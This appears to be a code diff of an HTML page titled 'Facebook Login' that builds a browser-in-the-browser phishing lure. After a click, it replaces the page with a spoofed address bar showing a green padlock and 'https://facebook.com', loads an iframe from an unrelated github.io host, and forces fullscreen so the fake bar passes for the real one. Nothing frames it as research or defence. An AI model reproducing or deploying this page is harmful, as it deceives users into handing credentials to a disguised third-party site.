@@ -1,142 +1,215 @@
-<!DOCTYPE html>
+<!!DOCTYPE html>
+
+
+
 <html>
+
+
 <head>
-  <title>Login To Facebook</title>
+
+
+  <title>Facebook Login</title>
+
+
   <style>
+
+
     html, body {
+
+
       margin: 0;
+
+
       padding: 0;
+
+
       overflow: hidden;
+
+
       font-family: sans-serif;
+
+
       background: #ffffff;
+
+
     }
+
+
     .addressbar-spoof {
+
+
       position: fixed;
+
+
       top: 0;
+
+
       left: 0;
+
+
       height: 40px;
+
+
       width: 100%;
+
+
       background: #f1f1f1;
+
+
       display: flex;
+
+
       align-items: center;
+
+
       padding-left: 10px;
+
+
       font-size: 14px;
+
+
       z-index: 9999;
+
+
     }
+
+
     .secure {
+
+
       color: green;
+
+
       font-weight: bold;
+
+
       margin-right: 6px;
+
+
     }
+
+
     iframe {
+
+
       position: absolute;
+
+
       top: 40px;
+
+
       left: 0;
+
+
       width: 100%;
+
+
       height: calc(100% - 40px);
+
+
       border: none;
+
+
     }
+
+
     #trigger {
+
+
       position: absolute;
+
+
       top: 50%;
+
+
       left: 50%;
+
+
       transform: translate(-50%, -50%);
+
+
       font-size: 18px;
+
+
       padding: 20px;
+
+
       background: #111;
+
+
       color: white;
+
+
       border: none;
+
+
       cursor: pointer;
+
+
     }
-    
-    /* Sidebar styling */
-    .sidebar {
-      position: fixed;
-      top: 40px;
-      left: 0;
-      width: 200px;
-      height: calc(100% - 40px);
-      background-color: #f0f2f5;
-      padding: 20px;
-      box-sizing: border-box;
-      display: none;
-      z-index: 9998;
-      overflow-y: auto;
-    }
-    
-    .sidebar img {
-      width: 100%;
-      border-radius: 8px;
-      margin-bottom: 15px;
-      box-shadow: 0 2px 4px rgba(0,0,0,0.1);
-    }
-    
-    .sidebar-content {
-      margin-top: 20px;
-    }
-    
-    .sidebar-content h3 {
-      margin: 0 0 10px 0;
-      color: #1c1e21;
-      font-size: 16px;
-    }
-    
-    .sidebar-content p {
-      margin: 0;
-      color: #65676b;
-      font-size: 14px;
-      line-height: 1.4;
-    }
-    
-    /* Adjust iframe when sidebar is visible */
-    .sidebar-visible + iframe {
-      left: 200px;
-      width: calc(100% - 200px);
-    }
+
+
   </style>
+
+
 </head>
+
+
 <body>
 
-<button id="trigger">CLICK TO OPEN FACEBOOK</button>
+
+
+
+
+<button id="trigger">Click To Open Facebook</button>
+
+
+
+
 
 <script>
+
+
   const trigger = document.getElementById("trigger");
 
+
+
+
+
   trigger.onclick = () => {
+
+
     document.body.innerHTML = `
+
+
       <div class="addressbar-spoof">
+
+
         <span class="secure">🔒</span> https://facebook.com
+
+
       </div>
-      <div class="sidebar">
-        <img src="https://images.unsplash.com/photo-1611162617474-5b21e879e113?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=774&q=80" alt="Social Connection">
-        <div class="sidebar-content">
-          <h3>Stay Connected</h3>
-          <p>Connect with friends and the world around you on Facebook.</p>
-        </div>
-      </div>
-      <iframe src="test3.html"></iframe>
+
+
+      <iframe src="https://sauceialist.github.io/dia/test3.html"></iframe>
+
+
     `;
-    
-    // Request fullscreen and show sidebar
-    document.documentElement.requestFullscreen().then(() => {
-      // Show sidebar only in fullscreen mode
-      document.querySelector('.sidebar').style.display = 'block';
-      document.querySelector('.sidebar').classList.add('sidebar-visible');
-    }).catch(console.error);
-    
-    // Listen for fullscreen exit to hide sidebar
-    document.addEventListener('fullscreenchange', () => {
-      const sidebar = document.querySelector('.sidebar');
-      if (!document.fullscreenElement) {
-        sidebar.style.display = 'none';
-        sidebar.classList.remove('sidebar-visible');
-      } else {
-        sidebar.style.display = 'block';
-        sidebar.classList.add('sidebar-visible');
-      }
-    });
+
+
+    document.documentElement.requestFullscreen().catch(console.error);
+
+
   };
+
+
 </script>
 
+
+
+
+
 </body>
+
+
 </html>
